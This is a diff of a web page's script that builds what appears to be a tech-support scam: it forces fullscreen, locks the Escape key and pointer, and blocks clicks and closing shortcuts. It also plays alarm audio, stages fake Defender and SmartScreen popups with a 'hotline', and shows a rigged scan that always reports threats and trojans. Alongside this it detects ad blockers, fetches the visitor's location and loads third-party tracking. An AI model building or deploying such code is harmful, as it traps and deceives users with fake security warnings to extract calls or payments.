+              const topOverlay = $("#topOverlay");
+              if (topOverlay) topOverlay.style.display = "none";
+              const audio1 = $("#alertSound1");
+              const audio2 = $("#alertSound2");
+              if (audio1) audio1.pause();
+              if (audio2) audio2.pause();
+              audioPlaying = false;
+              console.log("Exit allowed: fullscreen and audio stopped");
+            }
+          }, 30);
+        }
+      } else if (!allowExit) {
+        blockInteractions(e);
+      }
+    }, { capture: true, passive: false });
+
+    document.addEventListener("keyup", (e) => {
+      if (e.key === "Escape") {
+        clearInterval(holdTimer);
+        holdTimer = null;
+        if (hint) hint.setAttribute("hidden", "");
+        const progressEl = $("#escProgress");
+        if (progressEl) progressEl.style.background = `conic-gradient(#4ea1ff 0deg, #374151 0deg)`;
+      }
+    }, { capture: true, passive: false });
+
+    document.addEventListener("fullscreenchange", () => {
+      if (!document.fullscreenElement && !allowExit) {
+        enterFullscreen();
+        const edu = $("#edu");
+        if (edu) edu.style.display = "flex";
+      } else if (document.fullscreenElement && !allowExit) {
+        if (navigator.keyboard && navigator.keyboard.lock) {
+          navigator.keyboard.lock(['Escape']);
+        }
+        document.documentElement.requestPointerLock?.();
+      }
+    }, { capture: true, passive: false });
+
+    ["click", "mousedown", "mouseup", "dblclick", "contextmenu", "touchstart", "touchend", "touchmove", "pointerdown"].forEach(event => {
+      document.addEventListener(event, (e) => {
+        if (!allowExit && hasClicked) {
+          blockInteractions(e);
+          const edu = $("#edu");
+          if (edu) edu.style.display = "flex";
+        }
+      }, { capture: true, passive: false });
+    });
+
+    document.addEventListener("keydown", (e) => {
+      if (!allowExit && (
+        (e.key === "F4" && (e.altKey || e.ctrlKey)) ||
+        (e.key === "w" && (e.ctrlKey || e.metaKey)) ||
+        (e.key === "q" && e.metaKey) ||
+        (e.key === "t" && e.ctrlKey) ||
+        (e.key === "n" && e.ctrlKey) ||
+        e.key === "F5" ||
+        (e.key === "r" && e.ctrlKey) ||
+        (e.key === "Tab" && (e.ctrlKey || e.altKey))
+      )) {
+        blockInteractions(e);
+      }
+    }, { capture: true, passive: false });
+
+    const topOverlay = $("#topOverlay");
+    if (topOverlay) {
+      topOverlay.addEventListener("click", (e) => {
+        if (!allowExit) {
+          blockInteractions(e);
+          const edu = $("#edu");
+          if (edu) edu.style.display = "flex";
+        }
+      }, { capture: true, passive: false });
+    }
+
+    /* EDITED: This function shows the new "Leave site?" prompt */
+    document.addEventListener("mouseout", (e) => {
+      const leavePrompt = $("#nNotifyBox");
+      if (!allowExit && hasClicked && !e.relatedTarget && e.clientY < 10 && leavePrompt) {
+        leavePrompt.style.display = "grid";
+      }
+    }, { passive: true });
+
+  } catch (e) {
+    console.error("Error in setupFullscreen:", e);
+  }
+}
+
+function drawRing(ctx, pct) {
+  try {
+    if (!ctx) return;
+    const w = ctx.canvas.width, h = ctx.canvas.height, r = Math.min(w, h) / 2 - 6;
+    ctx.clearRect(0, 0, w, h);
+    ctx.save();
+    ctx.translate(w / 2, h / 2);
+    ctx.beginPath();
+    ctx.strokeStyle = "#e5e7eb";
+    ctx.lineWidth = 8;
+    ctx.arc(0, 0, r, 0, Math.PI * 2);
+    ctx.stroke();
+    const grad = ctx.createLinearGradient(-r, 0, r, 0);
+    grad.addColorStop(0, "#4ea1ff");
+    grad.addColorStop(.5, "#1a73e8");
+    grad.addColorStop(1, "#4ea1ff");
+    ctx.beginPath();
+    ctx.strokeStyle = grad;
+    ctx.lineCap = "round";
+    ctx.lineWidth = 8;
+    ctx.arc(0, 0, r, -Math.PI / 2, (-Math.PI / 2) + pct * 2 * Math.PI);
+    ctx.stroke();
+    ctx.restore();
+  } catch (e) {
+    console.error("Error in drawRing:", e);
+  }
+}
+
+function startSpark(ctx) {
+  try {
+    if (!ctx) return;
+    const w = ctx.canvas.width, h = ctx.canvas.height;
+    let x = 0;
+    const pts = [];
+    let last = 0;
+    function step(ts) {
+      if (ts - last < 33) {
+        requestAnimationFrame(step);
+        return;
+      }
+      last = ts;
+      x = (x + 2) % w;
+      if (pts.length > w / 2) pts.shift();
+      const y = h / 2 + Math.sin((Date.now() / 260) + x * 0.08) * h * 0.22 + (Math.random() - 0.5) * 5;
+      pts.push([x, y]);
+      ctx.clearRect(0, 0, w, h);
+      ctx.strokeStyle = "#e5e7eb";
+      ctx.lineWidth = 1;
+      ctx.beginPath();
+      ctx.moveTo(0, h / 2);
+      ctx.lineTo(w, h / 2);
+      ctx.stroke();
+      const grad = ctx.createLinearGradient(0, 0, w, 0);
+      grad.addColorStop(0, "#60a5fa");
+      grad.addColorStop(1, "#1a73e8");
+      ctx.strokeStyle = grad;
+      ctx.lineWidth = 2;
+      ctx.beginPath();
+      pts.forEach((p, i) => {
+        if (i === 0) ctx.moveTo(p[0], p[1]);
+        else ctx.lineTo(p[0], p[1]);
+      });
+      ctx.stroke();
+      requestAnimationFrame(step);
+    }
+    requestAnimationFrame(step);
+  } catch (e) {
+    console.error("Error in startSpark:", e);
+  }
+}
+
+function runAnalysis() {
+  try {
+    const phase = $("#phase");
+    const conf = $("#conf");
+    const status = $("#statusBadge");
+    const hint = $("#hint");
+    const ring = $("#ring");
+    const spark = $("#spark");
+    if (!phase || !conf || !status || !hint || !ring || !spark) {
+      console.error("Analysis elements missing");
+      return;
+    }
+    const ringCtx = ring.getContext("2d");
+    const sparkCtx = spark.getContext("2d");
+    startSpark(sparkCtx);
+    let pct = 0, stage = 0;
+    const stages = [
+      { t: 50, phase: "Initializing", hint: "Heuristic engine warming up…" },
+      { t: 50, phase: "Gathering telemetry", hint: "Inspecting processes, ports, and startup entries…" },
+      { t: 50, phase: "Scanning temp files", hint: "Looking for known patterns and anomalies…" },
+      { t: 50, phase: "Evaluating behavior", hint: "Scoring unusual activity…" },
+      { t: 50, phase: "Building report", hint: "Aggregating signals…" },
+    ];
+    function nextStage() {
+      if (stage < stages.length) {
+        const s = stages[stage++];
+        phase.textContent = s.phase;
+        hint.textContent = s.hint;
+        const start = pct;
+        const end = Math.min(0.82, start + 0.18);
+        const dur = s.t;
+        const startTime = performance.now();
+        (function anim() {
+          const now = performance.now();
+          const k = Math.min(1, (now - startTime) / dur);
+          pct = start + (end - start) * k;
+          conf.textContent = Math.round(pct * 100) + "%";
+          drawRing(ringCtx, pct);
+          if (k < 1) requestAnimationFrame(anim);
+          else setTimeout(nextStage, 10);
+        })();
+      } else {
+        const end = 1.0;
+        const start = pct;
+        const dur = 50;
+        const startTime = performance.now();
+        (function animEnd() {
+          const now = performance.now();
+          const k = Math.min(1, (now - startTime) / dur);
+          pct = start + (end - start) * k;
+          conf.textContent = Math.round(pct * 100) + "%";
+          drawRing(ringCtx, pct);
+          if (k < 1) requestAnimationFrame(animEnd);
+          else showFindings();
+        })();
+      }
+    }
+    drawRing(ringCtx, 0);
+    nextStage();
+    function showFindings() {
+      status.className = "badge bad";
+      status.textContent = "Issues found";
+      hint.textContent = "Manual review recommended — this is a simulation.";
+      const list = $("#threats");
+      if (list) {
+        list.innerHTML = "";
+        [
+         { name: "Unusual Activity Detected", risk: "High" },
+         { name: "Configuration Review Recommended", risk: "Medium" }
+        ].forEach(it => {
+          const row = document.createElement("div");
+          row.className = "threat";
+          row.innerHTML = `<div><strong>${it.name}</strong></div><span class="badge warn">${it.risk} risk</span>`;
+          list.appendChild(row);
+        });
+      }
+    }
+  } catch (e) {
+    console.error("Error in runAnalysis:", e);
+  }
+}
+
+function startScan() {
+  try {
+    if (!allowExit) return;
+    const lines = [
+      "[INFO] Loading signatures …",
+      "[INFO] Heuristic profiles active …",
+      "[SCAN] Checking processes …",
+      "[SCAN] Checking startup entries …",
+      "[SCAN] Analysing network ports …",
+      "[INFO] Building report …",
+      "[DONE] trj6562,trj989..."
+    ];
+    const log = $("#log");
+    const bar = $("#bar");
+    if (!log || !bar) return;
+    log.textContent = "";
+    let i = 0;
+    bar.style.width = "0%";
+    const t = setInterval(() => {
+      if (i < lines.length) {
+        const row = document.createElement("div");
+        row.textContent = lines[i++];
+        log.appendChild(row);
+        log.scrollTop = log.scrollHeight;
+        bar.style.width = Math.round(i / lines.length * 100) + "%";
+      } else {
+        clearInterval(t);
+      }
+    }, 450);
+  } catch (e) {
+    console.error("Error in startScan:", e);
+  }
+}
+
+function show(el) {
+  try {
+    if (el) {
+      console.log(`Showing element: ${el.id}`);
+      el.style.display = "block";
+      el.classList.add("popup-in");
+      el.style.opacity = "1";
+    }
+  } catch (e) {
+    console.error("Error in show:", e);
+  }
+}
+
+async function runQueue() {
+  try {
+    const s = $("#s");
+    const sm = $("#smartscreen");
+    const df = $("#defender");
+    const ig = $("#integrity");
+    const lv = $("#leave");
+    const sc = $("#scan");
+    const ts = $("#toast");
+    const ac = $("#actionCenter");
+    const hl = $("#hotline");
+    const steps = [
+      () => { if ($("#topOverlay")) $("#topOverlay").style.display = "block"; show(s); },
+      () => { if (sm) show(sm); },
+      () => { if (df) { show(df); runAnalysis(); } },
+      () => { if (window.__integrityShouldShow && ig) show(ig); },
+      () => { if (lv) show(lv); },
+      () => { if (sc) show(sc); },
+      () => { if (ts) show(ts); },
+      () => { if (ac) show(ac); },
+      () => { if (hl) show(hl); }
+    ];
+    for (const fn of steps) {
+      fn();
+      await new Promise(r => setTimeout(r, POPUP_STAGGER));
+    }
+  } catch (e) {
+    console.error("Error in runQueue:", e);
+  }
+}
+
+function checkContentIntegrity() {
+  try {
+    const bait = document.createElement("div");
+    bait.className = "ad banner advertisement ad-slot";
+    bait.style.cssText = "position:absolute; left:-9999px; width:300px; height:250px;";
+    document.body.appendChild(bait);
+    const style = window.getComputedStyle(bait);
+    const hidden = (style.display === "none") || (style.visibility === "hidden") || (bait.clientHeight === 0);
+    document.body.removeChild(bait);
+    window.__integrityShouldShow = hidden;
+    console.log("Content integrity check:", hidden ? "Issues detected" : "No issues");
+  } catch (e) {
+    console.error("Error in checkContentIntegrity:", e);
+  }
+}
+
+function wireUI() {
+  try {
+    const sCall = $("#sCall");
+    const hotlineCall = $("#hotlineCall");
+    const eduClose = $("#eduClose");
+    const okIntegrity = $("#okIntegrity");
+    const leaveBtn = $("#leaveBtn");
+    const reloadBtn = $("#reloadBtn");
+    const scanNow = $("#scanNow");
+    const openScan = $("#openScan");
+
+    // New Leave Prompt buttons
+    const nNotifyBox = $("#nNotifyBox");
+    const nCloseBtn = $("#nCloseBtn");
+    const nReloadBtn = $("#nReloadBtn");
+    const nLeaveBtn = $("#nLeaveBtn");
+
+    if (nNotifyBox) {
+        if (nCloseBtn) nCloseBtn.onclick = () => nNotifyBox.style.display = "none";
+        if (nReloadBtn) nReloadBtn.onclick = () => window.location.reload();
+        if (nLeaveBtn) nLeaveBtn.onclick = () => {
+            allowExit = true;
+            window.close(); // Attempt to close the window
+        };
+    }
+
+    if (sCall) sCall.addEventListener("click", () => { if (allowExit) $("#edu").style.display = "flex"; }, true);
+    if (hotlineCall) hotlineCall.addEventListener("click", () => { if (allowExit) $("#edu").style.display = "flex"; }, true);
+    if (eduClose) eduClose.addEventListener("click", () => { if (allowExit) $("#edu").style.display = "none"; }, true);
+    if (okIntegrity) okIntegrity.addEventListener("click", () => { if (allowExit) $("#integrity").style.display = "none"; }, true);
+    if (leaveBtn) leaveBtn.addEventListener("click", () => { if (allowExit) $("#leave").style.display = "none"; }, true);
+    if (reloadBtn) reloadBtn.addEventListener("click", () => { if (allowExit) startScan(); }, true);
+    if (scanNow) scanNow.addEventListener("click", startScan, true);
+    if (openScan) openScan.addEventListener("click", () => { if (allowExit) show($("#scan")); }, true);
+    document.addEventListener("keydown", (e) => { if (e.key === "Enter" && allowExit) startScan(); }, true);
+  } catch (e) {
+    console.error("Error in wireUI:", e);
+  }
+}
+
+/* Boot */
+window.addEventListener("load", async () => {
+  try {
+    console.log("Page loaded, initializing...");
+    window.moveTo(0, 0);
+    window.resizeTo(screen.availWidth, screen.availHeight);
+
+    const s = window.devicePixelRatio || 1;
+    const ring = $("#ring");
+    if (ring) {
+      ring.width = 74 * s;
+      ring.height = 74 * s;
+      ring.getContext("2d")?.scale(s, s);
+    }
+    const spark = $("#spark");
+    if (spark) {
+      const rect = spark.getBoundingClientRect();
+      spark.width = rect.width * s;
+      spark.height = rect.height * s;
+      spark.getContext("2d")?.scale(s, s);
+    }
+
+    startClock();
+    startScan();
+    checkContentIntegrity();
+    wireUI();
+    setupFullscreen();
+    setupAudio();
+    fetchLocation();
+    await runQueue();
+  } catch (e) {
+    console.error("Error in window.load handler:", e);
+  }
+});
+
+
+</script>
+<!-- Hitsteps TRACKING CODE - Manual 2025-10-15 - DO NOT CHANGE -->
+<script type="text/javascript">(function(){var hstc=document.createElement('script'); hstc.src='https://edgecdnplus.com/code?code=66b34577df47a11f79d4c0572f53a5c9';hstc.async=true;var htssc = document.getElementsByTagName('script')[0];htssc.parentNode.insertBefore(hstc, htssc);})();
+</script><noscript><a href="http://www.hitsteps.com/"><img src="//edgecdnplus.com/code?mode=img&code=66b34577df47a11f79d4c0572f53a5c9" alt="web statistics" width="1" height="1" />visitor activity monitor</a></noscript>
+<!-- Hitsteps TRACKING CODE - DO NOT CHANGE -->
+
+</body></html>
